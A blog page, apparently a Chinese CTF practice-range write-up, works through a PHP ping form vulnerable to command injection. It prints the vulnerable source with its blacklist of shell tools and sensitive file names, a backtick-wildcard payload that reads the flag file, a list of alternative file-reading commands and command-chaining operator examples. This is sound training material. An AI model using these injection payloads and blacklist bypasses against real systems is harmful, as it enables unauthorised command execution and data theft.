@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>20088靶场wp | Damya&#39;s Blog | あややこやや</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="靶场练习">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+<link rel="alternate" href="/atom.xml" title="Damya's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Damya</h5>
+          <a href="mailto:397526596@qq.com" title="397526596@qq.com" class="mail">
+            
+              <span>3</span>
+            
+              <span>9</span>
+            
+              <span>7</span>
+            
+              <span>5</span>
+            
+              <span>2</span>
+            
+              <span>6</span>
+            
+              <span>5</span>
+            
+              <span>9</span>
+            
+              <span>6</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/DamyaHome" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>20088靶场wp</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">20088靶场wp</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-11-14T08:10:32.000Z" itemprop="datePublished" class="page-time">
+  2019-11-14
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup-web/">ctf writeup web</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-20088靶场wp"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">20088靶场wp</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-11-14 16:10:32" datetime="2019-11-14T08:10:32.000Z"  itemprop="datePublished">2019-11-14</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup-web/">ctf writeup web</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h2 id="20088靶场wp"><a href="#20088靶场wp" class="headerlink" title="20088靶场wp"></a>20088靶场wp</h2><p>链接: <a href="http://172.17.135.48:20088" target="_blank" rel="noopener">172.17.135.48:20088</a></p>
+<h3 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">CTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Ping&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">"."</span> method=<span class="string">"GET"</span>&gt;</span><br><span class="line">        IP: &lt;input type=<span class="string">"text"</span> name=<span class="string">"ip"</span>&gt; &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Ping"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;<span class="meta">&lt;?php</span></span><br><span class="line">        $blacklist = [</span><br><span class="line">            <span class="string">'flag'</span>, <span class="string">'cat'</span>, <span class="string">'nc'</span>, <span class="string">'sh'</span>, <span class="string">'cp'</span>, <span class="string">'touch'</span>, <span class="string">'mv'</span>, <span class="string">'rm'</span>, <span class="string">'ps'</span>, <span class="string">'top'</span>, <span class="string">'sleep'</span>, <span class="string">'sed'</span>,</span><br><span class="line">            <span class="string">'apt'</span>, <span class="string">'yum'</span>, <span class="string">'curl'</span>, <span class="string">'wget'</span>, <span class="string">'perl'</span>, <span class="string">'python'</span>, <span class="string">'zip'</span>, <span class="string">'tar'</span>, <span class="string">'php'</span>, <span class="string">'ruby'</span>, <span class="string">'kill'</span>,</span><br><span class="line">            <span class="string">'passwd'</span>, <span class="string">'shadow'</span>, <span class="string">'root'</span>,</span><br><span class="line">            <span class="string">'z'</span>,</span><br><span class="line">            <span class="string">'dir'</span>, <span class="string">'dd'</span>, <span class="string">'df'</span>, <span class="string">'du'</span>, <span class="string">'free'</span>, <span class="string">'tempfile'</span>, <span class="string">'touch'</span>, <span class="string">'tee'</span>, <span class="string">'sha'</span>, <span class="string">'x64'</span>, <span class="string">'g'</span>,</span><br><span class="line">            <span class="string">'xargs'</span>, <span class="string">'PATH'</span>,</span><br><span class="line">            <span class="string">'$0'</span>, <span class="string">'proc'</span>,</span><br><span class="line">            <span class="string">'/'</span>, <span class="string">'&amp;'</span>, <span class="string">'|'</span>, <span class="string">'&gt;'</span>, <span class="string">'&lt;'</span>, <span class="string">';'</span>, <span class="string">'"'</span>, <span class="string">'\''</span>, <span class="string">'\\'</span>, <span class="string">"\n"</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        set_time_limit(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">($ip)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> $blacklist;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(strlen($ip) &gt; <span class="number">15</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'IP toooooo longgggggggggg'</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">foreach</span>($blacklist <span class="keyword">as</span> $keyword) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(strstr($ip, $keyword)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">"&#123;$keyword&#125; not allowed"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $ret = [];</span><br><span class="line">                exec(<span class="string">"ping -c 1 \"&#123;$ip&#125;\" 2&gt;&amp;1"</span>, $ret);</span><br><span class="line">                <span class="keyword">return</span> implode(<span class="string">"\n"</span>, array_slice($ret, <span class="number">0</span>, <span class="number">10</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">'ip'</span>]))</span><br><span class="line">            <span class="keyword">echo</span> htmlentities(ping($_GET[<span class="string">'ip'</span>]));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="meta">?&gt;</span>&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>可以发现是一道php的命令执行注入题,黑名单里过滤了很多命令,但是很多通配符没有过滤比如’$’,’`‘,’*‘等</p>
+<p>‘`‘在php中也叫执行运算符，使用时等同于<code>shell_exec()</code>函数,命令执行时PHP将尝试将反引号中的内容作为 shell命令来执行，并将其输出信息返回</p>
+<p>而exec()函数里的ping命令,表示只发一个request包且标准输出重定向到我们输入的命令,即在终端上执行我们输入的命令,形成注入漏洞,所以可以先尝试读取文件</p>
+<figure class="image-box">
+                <a rel=20088靶场wp href="./1.png" title="图片" data-fancybox="images"><img src="./1.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>可以发现命令执行成功,这时候就可以从shell命令着手,尝试读取flag.php</p>
+<p>在shell中,读取文件时的<code>*</code>表示任意数目的任意字符,在正则中表示重复前面的字符任意多次（包括0次）,两者在指明文件时的用法也不一样,正则里要用<code>^</code>表示匹配字符串开头,或用<code>+</code>表示匹配前面的字符1次或多次,在这道题里仅用<code>f*</code>即可指明为flag.php,其他题目读取时同理</p>
+<p>由此可以构造payload: </p>
+<p><a href="http://172.17.135.48:20088/?ip=`head%20f*`" target="_blank" rel="noopener">http://172.17.135.48:20088/?ip=<code>head%20f*</code></a></p>
+<figure class="image-box">
+                <a rel=20088靶场wp href="./2.png" title="图片" data-fancybox="images"><img src="./2.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>得到flag:  flag{Y0u_s01ve_1t_!!1}</p>
+<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>linux里用来读文件的命令很多,灵活使用可以绕过很多黑名单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat    由第一行开始显示文件内容</span><br><span class="line">tac    从最后一行开始显示，可以看出 tac 是 cat 的倒着写</span><br><span class="line">nl     显示的时候，顺道输出行号</span><br><span class="line">more   一页一页的显示文件内容</span><br><span class="line">less   与 more 类似，但是比 more 更好的是，可以往前翻页</span><br><span class="line">head   只看头几行</span><br><span class="line">tail   只看尾巴几行</span><br><span class="line">sort   可以在读取文件时进行排序输出</span><br></pre></td></tr></table></figure></p>
+<p>此外还有关于使用管道符拼接执行命令的操作,顺便记录一下</p>
+<ul>
+<li>Windows管道符</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">“|”:直接执行后面的语句。如:ping 127.0.0.1|whoami</span><br><span class="line"></span><br><span class="line">“||”:如果前面执行的语句出错泽执行后面的语句，前面的语句智能为假 如：ping 2 || whoami</span><br><span class="line"></span><br><span class="line">“&amp;”:如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 如 ping 127.0.0.1&amp;whoami</span><br><span class="line"></span><br><span class="line">“&amp;&amp;”:如果前面的语句为假则直接出错,也不执行后面的语句，前面的语句只能为真。例如:ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Linux管道符</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">“;”:执行完前面的语句再执行后面的 例如:ping 127.0.0.1;whoami</span><br><span class="line"></span><br><span class="line">“|”:显示后面语句的执行结果 例如:ping 127.0.0.1|whoami</span><br><span class="line"></span><br><span class="line">“||”:当前面的语句只能怪出错时，执行后面的语句，例如:ping 1||whoami</span><br><span class="line"></span><br><span class="line">“&amp;”:如果当前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如:ping 127.0.0.1&amp;whoami</span><br><span class="line"></span><br><span class="line">“&amp;&amp;”:如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真 例如:ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure>
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-11-14T09:01:53.633Z" itemprop="dateUpdated">2019-11-14 17:01:53</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/ctf-writeup-web/ckwd6020p0005kcuchuz7ht4s/" target="_blank" rel="external">https://www.damyahome.github.io/ctf-writeup-web/ckwd6020p0005kcuchuz7ht4s/</a>
+        
+    </div>
+    <footer>
+        <a href="https://www.damyahome.github.io">
+            <img src="/img/avatar.jpg" alt="Damya">
+            Damya
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/靶场练习/">靶场练习</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/ctf-writeup-web/ckwd6020p0005kcuchuz7ht4s/&title=《20088靶场wp》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/ctf-writeup-web/ckwd6020p0005kcuchuz7ht4s/&title=《20088靶场wp》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/工具/ckwd602470052kcucust7156m/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">wfuzz初使用!</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/ctf-writeup/ckwd6020s0006kcuccu9uy85n/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">2019picoCTF部分wp(5000分记录)</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#20088靶场wp"><span class="post-toc-number">1.</span> <span class="post-toc-text">20088靶场wp</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#源码审计"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">源码审计</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#补充"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">补充</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        让这个世界的bug有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.pdsdt.lovepdsdt.com/" target="_blank">Pdsdt</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.starssgo.top/" target="_blank">starssgo</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://phoebe233.cn/" target="_blank">W4nder</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.dongzt.cn/" target="_blank">Alkaid</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://whali3n51.top/" target="_blank">Whali3n51</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.ap1e.cn/" target="_blank">Aple</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://geeeez.github.io/" target="_blank">Geez</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://kkzevip.com/" target="_blank">MoR03r</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.virzz.com/" target="_blank">Virink</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.luoluopeach.top/" target="_blank">Luoluo</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://39.97.247.119/" target="_blank">Vigorous</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.constantine24.com/" target="_blank">Shanks</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.ysllz.com/" target="_blank">ysllz</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Damya &copy; 2018 - 2021
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/ctf-writeup-web/ckwd6020p0005kcuchuz7ht4s/&title=《20088靶场wp》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/ctf-writeup-web/ckwd6020p0005kcuchuz7ht4s/&title=《20088靶场wp》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACuElEQVR42u3a0YrjSgwE0Pn/n87Cfbss8VRJ3SELx08h8dh9PGA1Jf38xMfrv2NzzrtfX8GRr2F44OHh4Y2Wnl86Of/dmX9//+6b/ArPa8DDw8O7x3t+lefU5/Ofv8lLS7JmPDw8vG/gPS/0eYn5K/751Y+Hh4f3b/GSy7VloN3K4+Hh4X0PL7lNshXOA4V9pHs4a8HDw8OLeW0D7Bs+X+zv4eHh4S266vtGfh5etIFItE48PDy8C7y8+dSGFO3owGZz/8vK8fDw8I7yZotLbpOMGrSlIv83/K/u4eHh4V3j5RvcWTt/30KrQ2Q8PDy8C7x80ZvYIo8qNkWlDnPx8PDwFjFE8irPN9DttruNKvIV4uHh4d3g5QWjbU3tz2xXtaqHeHh4eCVvNigwO2cWbcweBB4eHt5neMmN88g1DzhmG/dhfcPDw8Nb8PIb53vzdiTrZ3H88oDw8PDwPsjLt8WnmmTt5jtaLR4eHt413tmBqjZmnRWSaJ14eHh4F3htiDBrYu0Hs/JHg4eHh/dJ3j42bR9K/XIv23h4eHh493izFv6+fbUZqCrKAx4eHt5R3tmIIQ84ZuNcdbMNDw8P7zKvvX1y43YEoS020S4bDw8P7yivXfSpInGKVITCeHh4eEd5ecN+M26Vx8T7x/R2PgIPDw/vEG8Ws7ZDVG1ske+Qo/Xj4eHhHeXlL+vk9psQNo8w6v4eHh4e3jVeHgfkcWoeOsyu/8vf4uHh4R3lvcojj3RnW+q8wBRDV3h4eHhHecNKEv/asjcxxxCGh4eHN+JtGldJoJAPZrWxSFQM8PDw8K7x2g1x29q/V7vw8PDwvp/3Whyz8YKkGNTjVnh4eHgf4SVh62w8Kx8gaK+Jh4eHd4+XvMqTze6s6dWOKRTbbjw8PLwLvFkDrH1xb64wC0Hw8PDwLvD+AE5Tu2AHW0JsAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '等你回来呀~';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)欢迎回来!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
